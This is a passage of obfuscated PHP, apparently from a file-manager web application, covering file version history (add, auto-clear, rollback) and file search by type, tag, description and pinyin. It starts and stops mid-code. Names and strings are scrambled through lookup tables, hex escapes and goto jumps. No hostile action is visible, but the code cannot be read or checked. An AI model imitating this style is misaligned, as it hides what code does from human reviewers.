$¶ğÜ‰Öü, $Öä¥¾³©[$ƒ½Ó¢“Ñ[1252]], $ ÁŞåõŞ, $é¢ÒÆ®È); self::unzipErrorCheck($ƒ¥Óú€÷, array($ƒ½Ó¢“Ñ[1273], $ÖÎµŸÆ•, $‡’×Û®, $Öä¥¾³©, $ßéŞ‚îÑ)); if (IO::exist($¡èÆáÇí)) { IO::rename($¡èÆáÇí, get_path_this($ßéŞ‚îÑ)); } $±ÔåõŸ = $ßéŞ‚îÑ; } $¡„Óèö = $±ÔåõŸ; return array($ƒ½Ó¢“Ñ[230] => $±ÔåõŸ, $ƒ½Ó¢“Ñ[1251] => $‡’×Û®, $ƒ½Ó¢“Ñ[1253] => $¶ğÜ‰Öü); } private static function unzipErrorCheck($Áş“«, $İ¿²¡ş— = false) { $‚ò¬—Ì =& $_SERVER[ìïæ“œî]; if ($Áş“«[$‚ò¬—Ì[1274]]) { return !0; } write_log(array($‚ò¬—Ì[1275], $Áş“«, $İ¿²¡ş—), $‚ò¬—Ì[1276]); show_json($‚ò¬—Ì[1277] . json_encode($Áş“«[$‚ò¬—Ì[1264]]), !1); die; } } goto eÖÏÕ–í; B¯³¯ ˜Ê: class SourceHistoryModel extends ModelBase { protected $tableName = "\151\157\137\163\x6f\x75\x72\x63\145\137\150\x69\x73\x74\x6f\x72\171"; public function historyCount($€ÙöÕÂ¹) { $ıœÅ¡Äï =& $_SERVER[ìïæ“œî]; if (!$€ÙöÕÂ¹) { return array(); } if (is_string($€ÙöÕÂ¹) || is_int($€ÙöÕÂ¹)) { $€ÙöÕÂ¹ = array($€ÙöÕÂ¹); } $ÅØ–Õ¿« = array($ıœÅ¡Äï[193], $ıœÅ¡Äï[1979] => $ıœÅ¡Äï[565]); $ƒ·­»¡ = array($ıœÅ¡Äï[193] => array($ıœÅ¡Äï[7], $€ÙöÕÂ¹)); $‘ç·›Æ¤ = $this->field($ÅØ–Õ¿«)->where($ƒ·­»¡)->group($ıœÅ¡Äï[193])->select(); return array_to_keyvalue($‘ç·›Æ¤, $ıœÅ¡Äï[193], $ıœÅ¡Äï[565]); } public function addHistory($‘‘ø½à†, $¦ê±¤à· = '') { $í‘´½µò =& $_SERVER[ìïæ“œî]; $ÓëÖÚ÷² = array($í‘´½µò[491] => $‘‘ø½à†[$í‘´½µò[193]], $í‘´½µò[1738] => isset($‘‘ø½à†[$í‘´½µò[529]]) ? $‘‘ø½à†[$í‘´½µò[529]] : $‘‘ø½à†[$í‘´½µò[527]], $í‘´½µò[542] => $‘‘ø½à†[$í‘´½µò[541]], $í‘´½µò[617] => $‘‘ø½à†[$í‘´½µò[79]], $í‘´½µò[2196] => $¦ê±¤à·); if ($GLOBALS[$í‘´½µò[6]][$í‘´½µò[92]][$í‘´½µò[1279]] >= 1) { $this->historyAutoClear($ÓëÖÚ÷²[$í‘´½µò[193]]); $this->add($ÓëÖÚ÷²); } Hook::trigger($í‘´½µò[2197], $ÓëÖÚ÷²); Model($í‘´½µò[2198])->eventFileEdit($‘‘ø½à†[$í‘´½µò[193]]); } private function historyAutoClear($¾“¥‡Ş¬) { $ÄÈçŸ±‹ =& $_SERVER[ìïæ“œî]; $‘öú­ûò = Model($ÄÈçŸ±‹[819])->get($ÄÈçŸ±‹[1301]); $Ó–ˆÓì = intval($GLOBALS[$ÄÈçŸ±‹[6]][$ÄÈçŸ±‹[92]][$ÄÈçŸ±‹[1279]]); $÷ÈáÇ­ = $‘öú­ûò == $ÄÈçŸ±‹[1302] ? min(5, $Ó–ˆÓì) : $Ó–ˆÓì; $÷ÈáÇ­ = $÷ÈáÇ­ <= 0 ? 0 : $÷ÈáÇ­ - 1; if ($÷ÈáÇ­ >= 499) { return; } $–°åƒÅ = array($ÄÈçŸ±‹[491] => $¾“¥‡Ş¬); $í¹İŠ ¯ = $this->field($ÄÈçŸ±‹[2199])->where($–°åƒÅ)->order($ÄÈçŸ±‹[2193])->select(); if (!$í¹İŠ ¯ || $÷ÈáÇ­ >= count($í¹İŠ ¯)) { return; } $ããïÊô = array_to_keyvalue($í¹İŠ ¯, $ÄÈçŸ±‹[12], $ÄÈçŸ±‹[475]); $ããïÊô = array_slice($ããïÊô, $÷ÈáÇ­); $ëÜ˜­÷º = array_to_keyvalue($í¹İŠ ¯, $ÄÈçŸ±‹[12], $ÄÈçŸ±‹[541]); $ëÜ˜­÷º = array_slice($ëÜ˜­÷º, $÷ÈáÇ­); if (!$ããïÊô || !$ëÜ˜­÷º) { return; } $–°åƒÅ = array($ÄÈçŸ±‹[493] => array($ÄÈçŸ±‹[7], $ããïÊô)); $this->where($–°åƒÅ)->delete(); Model($ÄÈçŸ±‹[544])->remove($ëÜ˜­÷º); } public function listData($Ğâ±„¡) { $œâˆŞ— =& $_SERVER[ìïæ“œî]; $ï™ê²‡ = array($œâˆŞ—[491] => $Ğâ±„¡); $¡†ŞÌãİ = $œâˆŞ—[2200]; $Ô…éò•’ = $this->field($¡†ŞÌãİ)->where($ï™ê²‡)->order($œâˆŞ—[2193])->selectPage(); $this->_listAppendUser($Ô…éò•’[$œâˆŞ—[445]]); $‡Ã¹Ü±× = Model($œâˆŞ—[819])->get($œâˆŞ—[1301]); $ûöë¦‚˜ = 5; if ($‡Ã¹Ü±× == $œâˆŞ—[1302]) { $Ô…éò•’[$œâˆŞ—[445]] = array_slice($Ô…éò•’[$œâˆŞ—[445]], 0, $ûöë¦‚˜); $Ô…éò•’[$œâˆŞ—[442]] = array($œâˆŞ—[2201] => 1, $œâˆŞ—[2202] => 20, $œâˆŞ—[2203] => 1, $œâˆŞ—[2204] => count($Ô…éò•’[$œâˆŞ—[445]])); } return $Ô…éò•’; } protected function _listAppendUser(&$ïş¬É˜) { $ãêñãÑ =& $_SERVER[ìïæ“œî]; $ÕéŞ¿ïŒ = array_to_keyvalue($ïş¬É˜, $ãêñãÑ[12], $ãêñãÑ[1747]); $ò£çş…Í = Model($ãêñãÑ[598])->userListInfo($ÕéŞ¿ïŒ); foreach ($ïş¬É˜ as &$²à»†ÊÃ) { $üÔ¤ì€ä = $²à»†ÊÃ[$ãêñãÑ[1747]]; $²à»†ÊÃ[$ãêñãÑ[527]] = $ò£çş…Í[$üÔ¤ì€ä] ? $ò£çş…Í[$üÔ¤ì€ä] : !1; } unset($²à»†ÊÃ); } public function fileInfo($ÖšƒÇ°) { $ô€ÏœèĞ =& $_SERVER[ìïæ“œî]; $Ü³·ÄÅƒ = $this->tablePrefix; $µ€İ¹ªƒ = "{$Ü³·ÄÅƒ}\x69\x6f\x5f\146\x69\x6c\145\40\x66\x69\154\145\163\40\157\156\x20\x66\151\154\x65\x73\x2e\146\151\x6c\145\111\104\40\x3d\x20\x68\x69\x73\x74\157\x72\171\x2e\146\x69\x6c\x65\x49\104"; return $this->alias($ô€ÏœèĞ[2205])->where(array($ô€ÏœèĞ[493] => $ÖšƒÇ°))->join($µ€İ¹ªƒ, $ô€ÏœèĞ[2206])->find(); } public function removeItem($à©¯‚¸) { $ÔËóßÙ =& $_SERVER[ìïæ“œî]; $ûÙÍõÆÑ = array($ÔËóßÙ[493] => $à©¯‚¸); $ÕğùÓÊÙ = $this->where($ûÙÍõÆÑ)->find(); if ($ÕğùÓÊÙ) { $°Â±‚³‡ = $this->where($ûÙÍõÆÑ)->delete(); Model($ÔËóßÙ[544])->remove($ÕğùÓÊÙ[$ÔËóßÙ[541]]); return $°Â±‚³‡; } return !1; } public function removeBySource($·ùš†’£) { $’´œ»ğÓ =& $_SERVER[ìïæ“œî]; if (!$·ùš†’£) { return !1; } if (!is_array($·ùš†’£)) { $·ùš†’£ = array($·ùš†’£); } $Í¯§Öœ = array($’´œ»ğÓ[491] => array($’´œ»ğÓ[7], $·ùš†’£)); $ÎÃ¸™«¿ = $this->field($’´œ»ğÓ[542])->where($Í¯§Öœ)->select(); if ($ÎÃ¸™«¿) { $this->where($Í¯§Öœ)->delete(); $ÎÉŠıò˜ = array_to_keyvalue($ÎÃ¸™«¿, $’´œ»ğÓ[12], $’´œ»ğÓ[541]); Model($’´œ»ğÓ[544])->remove($ÎÉŠıò˜); } return !0; } public function setDetail($ÃæôÎµ», $Åäâà‹†) { $’ñ÷¾…× =& $_SERVER[ìïæ“œî]; return $this->where(array($’ñ÷¾…×[493] => $ÃæôÎµ»))->save(array($’ñ÷¾…×[2196] => $Åäâà‹†)); } public function rollbackToItem($îäğ™æô, $æô°¹—) { $¿¿„ìéã =& $_SERVER[ìïæ“œî]; $è¾¯Ü¬‰ = Model($¿¿„ìéã[873])->sourceInfo($îäğ™æô); $this->addHistory($è¾¯Ü¬‰, LNG($¿¿„ìéã[2207])); $˜Êæİúá = $this->find($æô°¹—); $Ââ¼µÔğ = array($¿¿„ìéã[541] => $˜Êæİúá[$¿¿„ìéã[541]], $¿¿„ìéã[79] => $˜Êæİúá[$¿¿„ìéã[79]], $¿¿„ìéã[88] => time(), $¿¿„ìéã[529] => USER_ID); Model($¿¿„ìéã[873])->where(array($¿¿„ìéã[193] => $îäğ™æô))->save($Ââ¼µÔğ); return $this->where(array($¿¿„ìéã[493] => $æô°¹—))->delete(); } public function clearSame($­ÛŒø‹´) { $´¾¥Ù£ =& $_SERVER[ìïæ“œî]; $¹º¸„µŞ = $this->listData($­ÛŒø‹´); $˜ŒˆÙ„ = array_to_keyvalue_group($¹º¸„µŞ, $´¾¥Ù£[541]); $½½¦«’ = array(); $æ¬™àÏ¸ = array(); foreach ($˜ŒˆÙ„ as $ã§Šğ) { if (!$ã§Šğ || count($ã§Šğ) <= 1) { continue; } foreach ($ã§Šğ as $ÉüËùÚÉ) { $½½¦«’[] = $ÉüËùÚÉ[$´¾¥Ù£[541]]; $æ¬™àÏ¸[] = $ÉüËùÚÉ[$´¾¥Ù£[475]]; } } if (!$æ¬™àÏ¸) { return; } $this->where(array($´¾¥Ù£[475] => array($´¾¥Ù£[7], $æ¬™àÏ¸)))->delete(); Model($´¾¥Ù£[544])->remove($½½¦«’); } public function userSpace() { $Å–¾Áº± =& $_SERVER[ìïæ“œî]; $—ú¯˜úé = $this->tablePrefix; $æ€ˆ’¸¨ = array($Å–¾Áº±[1738] => USER_ID); $¹¨§ÕøÀ = "{$—ú¯˜úé}\x69\157\x5f\146\151\154\145\40\x66\x69\x6c\x65\x73\40\x6f\156\x20\146\x69\x6c\145\163\56\146\x69\x6c\145\x49\x44\x20\75\40\150\x69\x73\x74\157\x72\x79\x2e\x66\x69\x6c\x65\111\x44"; return $this->alias($Å–¾Áº±[2205])->where($æ€ˆ’¸¨)->join($¹¨§ÕøÀ, $Å–¾Áº±[2206])->sum($Å–¾Áº±[79]); } } class SourceListSearchModel extends SourceListMoveModel { public static function fileTypeWhere($˜ˆÎĞÏ…) { $¾ó öïÚ =& $_SERVER[ìïæ“œî]; $ş¤¹¹á = KodIO::fileTypeList(); $øÈëë¶Í = $ş¤¹¹á[$˜ˆÎĞÏ…]; if (!$øÈëë¶Í) { return array(); } $­È–¬¯ó = $øÈëë¶Í[$¾ó öïÚ[169]]; $À³Ğ“³ = $¾ó öïÚ[7]; if (!$øÈëë¶Í[$¾ó öïÚ[169]]) { $¦ÕÕİô× = array_to_keyvalue($ş¤¹¹á, $¾ó öïÚ[12], $¾ó öïÚ[169]); $­È–¬¯ó = implode($¾ó öïÚ[50], $¦ÕÕİô×); $À³Ğ“³ = $¾ó öïÚ[2208]; } $åš¦œâÉ = explode($¾ó öïÚ[50], trim($­È–¬¯ó, $¾ó öïÚ[50])); return array($À³Ğ“³, $åš¦œâÉ); } public function listPathType($Ì¥ªÜˆ) { $‚øú¿Ò =& $_SERVER[ìïæ“œî]; $Šå÷ÛŸ­ = $this->fileTypeWhere($Ì¥ªÜˆ); if (!$Šå÷ÛŸ­) { return array(); } $Ìú»¼ÌÄ = USER_ID; $€Ã“ıüÂ = Model($‚øú¿Ò[598])->getInfo($Ìú»¼ÌÄ); $ÀšÃÆŒ = array($‚øú¿Ò[648] => SourceModel::TYPE_USER, $‚øú¿Ò[584] => array($‚øú¿Ò[612], $‚øú¿Ò[594] . $€Ã“ıüÂ[$‚øú¿Ò[90]][$‚øú¿Ò[193]] . $‚øú¿Ò[613]), $‚øú¿Ò[649] => $Ìú»¼ÌÄ, $‚øú¿Ò[646] => 0, $‚øú¿Ò[647] => $Šå÷ÛŸ­); return $this->listSource($ÀšÃÆŒ); } public function listSearch($Œ‡ú‹ƒŞ, $çó¼ÎÊ¦ = 300) { $øµİ°‚â =& $_SERVER[ìïæ“œî]; if (isset($Œ‡ú‹ƒŞ[$øµİ°‚â[2044]]) && $Œ‡ú‹ƒŞ[$øµİ°‚â[2044]]) { $Œ‡ú‹ƒŞ[$øµİ°‚â[2044]] = str_replace($øµİ°‚â[460], $øµİ°‚â[2209], trim($Œ‡ú‹ƒŞ[$øµİ°‚â[2044]])); } $Œ“ÖÊß× = $this->_parseSearchWhere($Œ‡ú‹ƒŞ); if (!isset($Œ“ÖÊß×[$øµİ°‚â[505]])) { $Œ“ÖÊß×[$øµİ°‚â[505]] = 0; } $¦¼ÙÈò = $øµİ°‚â[2210]; $ôƒ²î·ï = $Œ“ÖÊß×; $ş§ê¹ = $¦¼ÙÈò; $this->_listSearchBindPinyin($Œ‡ú‹ƒŞ, $Œ“ÖÊß×, $¦¼ÙÈò); $this->alias($øµİ°‚â[519])->_makeOrder(); $Œ“ÖÊß× = $this->parseWhereLike($Œ“ÖÊß×); $œ€âŒ£ = $this->distinct(!0)->field($¦¼ÙÈò)->where($Œ“ÖÊß×)->selectPage($çó¼ÎÊ¦); if ($GLOBALS[$øµİ°‚â[6]][$øµİ°‚â[457]][$øµİ°‚â[458]] && Input::check($Œ‡ú‹ƒŞ[$øµİ°‚â[2044]], $øµİ°‚â[655]) && $œ€âŒ£[$øµİ°‚â[442]][$øµİ°‚â[429]] == 1 && $œ€âŒ£[$øµİ°‚â[442]][$øµİ°‚â[443]] == 0) { $œ€âŒ£ = $this->distinct(!0)->field($¦¼ÙÈò)->where($ôƒ²î·ï)->limit(1000)->select(); $œ€âŒ£ = array_page_split($œ€âŒ£, !1, $çó¼ÎÊ¦); } $this->_listSearchFileContent($œ€âŒ£, $Œ‡ú‹ƒŞ, $ş§ê¹, $ôƒ²î·ï); $this->_listSearchDesc($œ€âŒ£, $Œ‡ú‹ƒŞ, $ş§ê¹); $this->_listSearchTag($œ€âŒ£, $Œ‡ú‹ƒŞ, $ş§ê¹); $this->_listSearchGroupTag($œ€âŒ£, $Œ‡ú‹ƒŞ, $ş§ê¹); $this->_listDataApply($œ€âŒ£[$øµİ°‚â[445]]); $this->_listMake($œ€âŒ£); return $œ€âŒ£; } private function _listSearchFileContent(&$ÒêÆÆû, $Ÿİü­˜–, $ïÅ¿Ó•Â, $Œ®‘«©Ñ) { $ÙÛáü‚è =& $_SERVER[ìïæ“œî]; if (!$Ÿİü­˜–[$ÙÛáü‚è[2044]] || $ÒêÆÆû[$ÙÛáü‚è[442]][$ÙÛáü‚è[429]] > 1) { return; } if (!isset($Œ®‘«©Ñ[$ÙÛáü‚è[32]]) || !is_array($Ÿİü­˜–[$ÙÛáü‚è[541]])) { return; } $Œ®‘«©Ñ[$ÙÛáü‚è[541]] = array($ÙÛáü‚è[7], $Ÿİü­˜–[$ÙÛáü‚è[541]]); unset($Œ®‘«©Ñ[$ÙÛáü‚è[32]]); unset($Ÿİü­˜–[$ÙÛáü‚è[541]]); $ú÷‰ôÎ• = $this->field($ïÅ¿Ó•Â)->where($Œ®‘«©Ñ)->limit($ÙÛáü‚è[2211])->select(); if (!$ú÷‰ôÎ• || count($ú÷‰ôÎ•) == 0) { return; } $ÒêÆÆû[$ÙÛáü‚è[445]] = array_merge($ú÷‰ôÎ•, $ÒêÆÆû[$ÙÛáü‚è[445]]); $ÒêÆÆû[$ÙÛáü‚è[442]][$ÙÛáü‚è[443]] += count($ú÷‰ôÎ•); } private function _listSearchTag(&$Œõêò«´, $ÚÀ³ºù¯, $›€é‹¦ª) { $ûª«ú¥® =& $_SERVER[ìïæ“œî]; if (!$ÚÀ³ºù¯[$ûª«ú¥®[2044]] || $Œõêò«´[$ûª«ú¥®[442]][$ûª«ú¥®[429]] > 1) { return; } $ÜÏ»¹Ö¹ = Model($ûª«ú¥®[2212])->listData(); $ß‰ÈÃç = array(); $‰¥³„¤ = $ÚÀ³ºù¯[$ûª«ú¥®[2044]]; foreach ($ÜÏ»¹Ö¹ as $û™†Íîú) { $ØÄªÇ = $û™†Íîú[$ûª«ú¥®[32]]; $ûñ‹µ…ú = str_replace($ûª«ú¥®[53], $ûª«ú¥®[12], Pinyin::get($ØÄªÇ)); if (stripos($ØÄªÇ, $‰¥³„¤) !== !1 || stripos($ûñ‹µ…ú, $‰¥³„¤) !== !1) { $ß‰ÈÃç[] = $û™†Íîú[$ûª«ú¥®[475]]; } } if (!$ß‰ÈÃç) { return; } $°ÙŸÄøÅ = array($ûª«ú¥®[500] => array($ûª«ú¥®[7], $ß‰ÈÃç), $ûª«ú¥®[1747] => USER_ID); $”Æº‚º× = Model($ûª«ú¥®[502])->field($ûª«ú¥®[87])->where($°ÙŸÄøÅ)->select(); $”Æº‚º× = array_to_keyvalue($”Æº‚º×, $ûª«ú¥®[12], $ûª«ú¥®[87]); $ÖÑüçæû = array_unique($”Æº‚º×); $this->_listSearchMerge($Œõêò«´, $ÚÀ³ºù¯, $›€é‹¦ª, $ÖÑüçæû); } private function _listSearchDesc(&$µ ”¿´, $…ªŠñ˜, $ã–ÅËíŸ) { $Ú†®Ìí =& $_SERVER[ìïæ“œî]; if (!$…ªŠñ˜[$Ú†®Ìí[2044]] || $µ ”¿´[$Ú†®Ìí[442]][$Ú†®Ìí[429]] > 1) { return; } $¿Ÿõñª· = array($Ú†®Ìí[97] => $Ú†®Ìí[526], $Ú†®Ìí[450] => array($Ú†®Ìí[459], $Ú†®Ìí[2046] . $…ªŠñ˜[$Ú†®Ìí[2044]] . $Ú†®Ìí[2046])); $Öâ«„†Ã = !1; if ($Öâ«„†Ã) { $Ë±èƒ˜Ç = $this->listSearchChildren($…ªŠñ˜[$Ú†®Ìí[192]]); $Ë±èƒ˜Ç = array_unique($Ë±èƒ˜Ç); if (!$Ë±èƒ˜Ç) { return; } $¿Ÿõñª·[$Ú†®Ìí[193]] = array($Ú†®Ìí[7], $Ë±èƒ˜Ç); } $ÒúÎÕã = Model($Ú†®Ìí[632])->field($Ú†®Ìí[193])->where($¿Ÿõñª·)->limit(5000)->select(); $÷Ò´»ëñ = array_to_keyvalue($ÒúÎÕã, $Ú†®Ìí[12], $Ú†®Ìí[193]); $this->_listSearchMerge($µ ”¿´, $…ªŠñ˜, $ã–ÅËíŸ, $÷Ò´»ëñ); } private function _listSearchGroupTag(&$úÙÉìçØ, $»Àäàµ, $ĞŠ±ªó²) { $ºöì—ì =& $_SERVER[ìïæ“œî]; if (!$»Àäàµ[$ºöì—ì[2044]] || $úÙÉìçØ[$ºöì—ì[442]][$ºöì—ì[429]] > 1 || !$»Àäàµ[$ºöì—ì[192]]) { return; } $Ş«ÍÑú = $this->sourceInfo($»Àäàµ[$ºöì—ì[192]]); if (!$Ş«ÍÑú || $Ş«ÍÑú[$ºöì—ì[190]] != SourceModel::TYPE_GROUP) { return; } $¨·›ñ¶á = $Ş«ÍÑú[$ºöì—ì[569]]; $ã¦ªşš = Model($ºöì—ì[2213])->get($¨·›ñ¶á); $ïˆ–°ş” = array(); $Ñ¹ÄËš€ = $»Àäàµ[$ºöì—ì[2044]]; foreach ($ã¦ªşš[$ºöì—ì[445]] as $ÛÉƒ¼Ê¶) { $é’“äîÄ = $ÛÉƒ¼Ê¶[$ºöì—ì[32]]; $ê”¥ï½ï = str_replace($ºöì—ì[53], $ºöì—ì[12], Pinyin::get($é’“äîÄ)); if (stripos($é’“äîÄ, $Ñ¹ÄËš€) !== !1 || stripos($ê”¥ï½ï, $Ñ¹ÄËš€) !== !1) { $ïˆ–°ş”[] = $ÛÉƒ¼Ê¶[$ºöì—ì[475]]; } } if (!$ïˆ–°ş”) { return; } $ğÁ…Ãª² = array($ºöì—ì[500] => array($ºöì—ì[7], $ïˆ–°ş”), $ºöì—ì[1747] => 0, $ºöì—ì[33] => $ºöì—ì[2066] . $¨·›ñ¶á); $Éõ·ÁĞÊ = Model($ºöì—ì[502])->field($ºöì—ì[87])->where($ğÁ…Ãª²)->select(); $Éõ·ÁĞÊ = array_to_keyvalue($Éõ·ÁĞÊ, $ºöì—ì[12], $ºöì—ì[87]); $ı«”áãÕ = array_unique($Éõ·ÁĞÊ); $this->_listSearchMerge($úÙÉìçØ, $»Àäàµ, $ĞŠ±ªó², $ı«”áãÕ); } private function _listSearchMerge(&$Ïåê‘á¼, $á±ˆ·Ì‹, $ëäÉÔ“ª, $ûÛ‡ôùÚ) { $¢ÍĞÄÈ„ =& $_SERVER[ìïæ“œî]; if (!$ûÛ‡ôùÚ) { return; } $†—õèÇÈ = array_to_keyvalue($Ïåê‘á¼[$¢ÍĞÄÈ„[445]], $¢ÍĞÄÈ„[12], $¢ÍĞÄÈ„[193]); $‰¼¸©È = array_diff($ûÛ‡ôùÚ, $†—õèÇÈ); if (!$‰¼¸©È) { return; } $¯„ú”¥„ = array($¢ÍĞÄÈ„[193] => array($¢ÍĞÄÈ„[7], $‰¼¸©È)); $İÆÃŸ°Ç = $this->field($ëäÉÔ“ª)->where($¯„ú”¥„)->select(); if (!$İÆÃŸ°Ç) { return; } $Œ ÁÛáó = array(); foreach ($İÆÃŸ°Ç as $ò¥åİú¼) { if ($this->_listSearchFilter($ò¥åİú¼, $á±ˆ·Ì‹)) { $Œ ÁÛáó[] = $ò¥åİú¼; } } $Ïåê‘á¼[$¢ÍĞÄÈ„[445]] = array_merge($Œ ÁÛáó, $Ïåê‘á¼[$¢ÍĞÄÈ„[445]]); $Ïåê‘á¼[$¢ÍĞÄÈ„[442]][$¢ÍĞÄÈ„[443]] += count($Œ ÁÛáó); } private function _listSearchFilter($ºÑ¢Ë•®, $ˆ¬ İ’—) { $õëÌ¤£‘ =& $_SERVER[ìïæ“œî]; $‰íâœ” = $ºÑ¢Ë•®[$õëÌ¤£‘[485]] == $õëÌ¤£‘[91]; if (!strstr($ºÑ¢Ë•®[$õëÌ¤£‘[584]], $õëÌ¤£‘[50] . $ˆ¬ İ’—[$õëÌ¤£‘[192]] . $õëÌ¤£‘[50])) { return !1; } if (isset($ˆ¬ İ’—[$õëÌ¤£‘[486]]) && $ˆ¬ İ’—[$õëÌ¤£‘[486]] != $õëÌ¤£‘[825]) { if ($ˆ¬ İ’—[$õëÌ¤£‘[486]] == $õëÌ¤£‘[78] && !$‰íâœ”) { return !1; } if ($ˆ¬ İ’—[$õëÌ¤£‘[486]] != $õëÌ¤£‘[78] && $‰íâœ”) { return !1; } if (!strstr($ºÑ¢Ë•®[$õëÌ¤£‘[169]], $õëÌ¤£‘[50] . $ˆ¬ İ’—[$õëÌ¤£‘[486]] . $õëÌ¤£‘[50])) { return !1; } } if (isset($ˆ¬ İ’—[$õëÌ¤£‘[2214]]) && $ˆ¬ İ’—[$õëÌ¤£‘[2214]] < $ºÑ¢Ë•®[$õëÌ¤£‘[79]]) { return !1; } if (isset($ˆ¬ İ’—[$õëÌ¤£‘[2215]]) && $ˆ¬ İ’—[$õëÌ¤£‘[2215]] > $ºÑ¢Ë•®[$õëÌ¤£‘[79]]) { return !1; } if (isset($ˆ¬ İ’—[$õëÌ¤£‘[662]]) && $ˆ¬ İ’—[$õëÌ¤£‘[662]] != $ºÑ¢Ë•®[$õëÌ¤£‘[529]]) { return !1; } return !0; } public function listSearchChildren($¸ïÖ‰Õ, $îÁù†²— = 5000) { $¾ÊŒíŸ =& $_SERVER[ìïæ“œî]; $ÍúØ•‰Ì = array(); $™õ÷¸ = $this->sourceInfo($¸ïÖ‰Õ); $èğ‰™¾½ = array($¾ÊŒíŸ[584] => array($¾ÊŒíŸ[459], $™õ÷¸[$¾ÊŒíŸ[584]] . $™õ÷¸[$¾ÊŒíŸ[193]] . $¾ÊŒíŸ[613])); $úÁ¨±ŸÙ = $this->field($¾ÊŒíŸ[79])->where($èğ‰™¾½)->limit($îÁù†²— + 1)->select(); $½¤²‘¨¡ = is_array($úÁ¨±ŸÙ) ? count($úÁ¨±ŸÙ) : 0; if ($½¤²‘¨¡ > $îÁù†²—) { return $this->_listSearchChildrenNear($¸ïÖ‰Õ, $îÁù†²—); } $ö ·¡º = $this->field($¾ÊŒíŸ[193])->where($èğ‰™¾½)->select(); $ÍúØ•‰Ì = array_to_keyvalue($ö ·¡º, $¾ÊŒíŸ[12], $¾ÊŒíŸ[193]); return $ÍúØ•‰Ì; } private function _listSearchChildrenNear($öİ±æĞ°, $†ä²Ùàç) { $ßÒ¯»Á° =& $_SERVER[ìïæ“œî]; $ÌæÑ¥ìé = array(); $œŞÉ½áÒ = array($ßÒ¯»Á°[192] => $öİ±æĞ°); $Æ³Å¨– = $this->field($ßÒ¯»Á°[2216])->where($œŞÉ½áÒ)->select(); $–§Ë¦„õ = array_to_keyvalue(array_filter_by_field($Æ³Å¨–, $ßÒ¯»Á°[485], $ßÒ¯»Á°[91]), $ßÒ¯»Á°[12], $ßÒ¯»Á°[193]); $ÌæÑ¥ìé = array_merge($ÌæÑ¥ìé, array_to_keyvalue($Æ³Å¨–, $ßÒ¯»Á°[12], $ßÒ¯»Á°[193])); if (!$–§Ë¦„õ) { return $ÌæÑ¥ìé; } $œŞÉ½áÒ = array($ßÒ¯»Á°[192] => array($ßÒ¯»Á°[7], $–§Ë¦„õ)); $Æ³Å¨– = $this->field($ßÒ¯»Á°[2216])->where($œŞÉ½áÒ)->limit($†ä²Ùàç)->select(); $ÌæÑ¥ìé = array_merge($ÌæÑ¥ìé, array_to_keyvalue($Æ³Å¨–, $ßÒ¯»Á°[12], $ßÒ¯»Á°[193])); $ÌæÑ¥ìé = array_slice($ÌæÑ¥ìé, 0, intval($†ä²Ùàç)); return $ÌæÑ¥ìé; } private function _listSearchBindPinyin($¤«âÑ‡É, &$ö¤¦ıùß, &$®ì·Ô’) { $¥œ²çªÜ =& $_SERVER[ìïæ“œî]; if (!isset($¤«âÑ‡É[$¥œ²çªÜ[2044]]) || !$¤«âÑ‡É[$¥œ²çªÜ[2044]]) { return; } if (!Input::check($¤«âÑ‡É[$¥œ²çªÜ[2044]], $¥œ²çªÜ[394]) || strlen($¤«âÑ‡É[$¥œ²çªÜ[2044]]) < 2) { return; } $í×˜³ª’ = "\x4c\105\x46\124\40\112\117\111\x4e\x20{$this->tablePrefix}\x69\157\137\x73\x6f\x75\162\x63\x65\x5f\155\x65\164\x61\x20\155\x65\164\x61\x20\157\x6e\x20\x73\157\165\x72\143\x65\56\x73\157\x75\162\x63\145\x49\x44\40\x3d\40\x6d\x65\164\x61\56\163\x6f\x75\162\143\145\111\104"; $Ÿ‘É¯ÔÓ = array(); $®ì·Ô’ = str_replace(array($¥œ²çªÜ[262], $¥œ²çªÜ[53], $¥œ²çªÜ[2217]), $¥œ²çªÜ[12], $®ì·Ô’); $®ì·Ô’ = $¥œ²çªÜ[511] . str_replace($¥œ²çªÜ[50], $¥œ²çªÜ[512], $®ì·Ô’); $Œø‰ã¶Ø = $ö¤¦ıùß[$¥œ²çªÜ[32]]; unset($ö¤¦ıùß[$¥œ²çªÜ[32]]); foreach ($ö¤¦ıùß as $À¢Ó£Š¯ => $ƒ•àéÓÆ) { $Ÿ‘É¯ÔÓ[$¥œ²çªÜ[511] . $À¢Ó£Š¯] = $ƒ•àéÓÆ; } foreach ($Œø‰ã¶Ø as $àÆÅ½Öö) { $Ÿ‘É¯ÔÓ[] = array($¥œ²çªÜ[516] => $àÆÅ½Öö, $¥œ²çªÜ[1055] => $¥œ²çªÜ[2048], array($¥œ²çªÜ[2218] => $àÆÅ½Öö, $¥œ²çªÜ[2219] => array($¥œ²çªÜ[7], array($¥œ²çªÜ[538], $¥œ²çªÜ[537])))); } $this->join($í×˜³ª’); $ö¤¦ıùß = $Ÿ‘É¯ÔÓ; } private function _parseSearchWhere($ĞÒÃ¢„) { $÷Ì©˜„ =& $_SERVER[ìïæ“œî]; $Á ÒÙñÏ = array(); if (isset($ĞÒÃ¢„[$÷Ì©˜„[809]]) && $ĞÒÃ¢„[$÷Ì©˜„[809]]) { $Á ÒÙñÏ[$÷Ì©˜„[88]] = array($÷Ì©˜„[2220], $ĞÒÃ¢„[$÷Ì©˜„[809]]); } if (isset($ĞÒÃ¢„[$÷Ì©˜„[810]]) && $ĞÒÃ¢„[$÷Ì©˜„[810]]) { $–ö—’ë£ = array($÷Ì©˜„[2221], $ĞÒÃ¢„[$÷Ì©˜„[810]]); if ($Á ÒÙñÏ[$÷Ì©˜„[88]]) { $Á ÒÙñÏ[$÷Ì©˜„[88]] = array($Á ÒÙñÏ[$÷Ì©˜„[88]], $–ö—’ë£, $÷Ì©˜„[2222]); } else { $Á ÒÙñÏ[$÷Ì©˜„[88]] = $–ö—’ë£; } } if (isset($ĞÒÃ¢„[$÷Ì©˜„[2214]]) && $ĞÒÃ¢„[$÷Ì©˜„[2214]] > 0) { $Á ÒÙñÏ[$÷Ì©˜„[79]] = array($÷Ì©˜„[2220], $ĞÒÃ¢„[$÷Ì©˜„[2214]]); } if (isset($ĞÒÃ¢„[$÷Ì©˜„[2215]]) && $ĞÒÃ¢„[$÷Ì©˜„[2215]]) { $–ö—’ë£ = array($÷Ì©˜„[2221], $ĞÒÃ¢„[$÷Ì©˜„[2215]]); if ($Á ÒÙñÏ[$÷Ì©˜„[79]]) { $Á ÒÙñÏ[$÷Ì©˜„[79]] = array($Á ÒÙñÏ[$÷Ì©˜„[79]], $–ö—’ë£, $÷Ì©˜„[2222]); } else { $Á ÒÙñÏ[$÷Ì©˜„[79]] 